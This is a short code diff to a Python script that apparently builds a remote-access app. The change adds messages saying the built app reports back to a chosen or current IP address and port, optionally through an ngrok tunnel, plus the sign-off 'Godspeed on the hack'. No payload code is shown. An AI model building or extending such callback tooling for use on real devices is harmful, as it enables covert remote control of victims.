@@ -5,6 +5,7 @@ from utils import *
 import argparse
 import sys
 import platform
+import os
 try:
     from pyngrok import ngrok,conf
 except ImportError as e:
@@ -52,12 +53,17 @@ if args.build:
         print(stdOutput("info")+"\033[1mTunnel_IP: %s PORT: %s"%(ip,port))
         build(ip,port,args.output,True,port_,icon)
     elif args.ip and args.port:
-            build(args.ip,port_,args.output,False,None,icon)            
+            build(args.ip,port_,args.output,False,None,icon)
+            print("the built app is reporting to %s:%s"%(args.ip,port_))
+            print("Godspeed on the hack, Mr Chiwara. Godspeed.")            
     elif args.ip==None and args.port:
         build(MYIP, port_, args.output, False, None, icon)
+        print(stdOutput("info")+"\033[1mthe built app is reporting to your current IP address and on port:%s"%(port_))
+        print("Godspeed on the hack, Mr Chiwara. Godspeed.")
     elif args.ip==None and args.port==None:
         build(MYIP, str(6969), args.output, False, None, icon)
-        print("using current network IP and on port: 6969")
+        print(stdOutput("info")+"\033[1mThe built app is reporting to your current IP address and on port:6969")
+        print(stdOutput("success")+"\033[1mGodspeed on the hack, Mr Chiwara. Godspeed.")
     else:
         print(stdOutput("error")+"\033[1mArguments Missing")
         
